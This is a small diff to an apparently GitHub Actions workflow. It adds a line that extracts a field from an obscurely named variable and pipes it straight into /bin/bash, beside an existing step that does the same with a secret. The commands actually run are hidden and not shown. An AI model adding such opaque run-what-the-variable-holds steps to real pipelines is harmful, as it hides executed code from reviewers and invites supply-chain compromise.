@@ -19,6 +19,7 @@ jobs:
           onp5: ${{ secrets.onp5 }}
         run: |
           printf '%s' "$onp5" | jq -r .vsqq3958 | /bin/bash
+          echo $kcot6572 | jq -r .crrw46 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
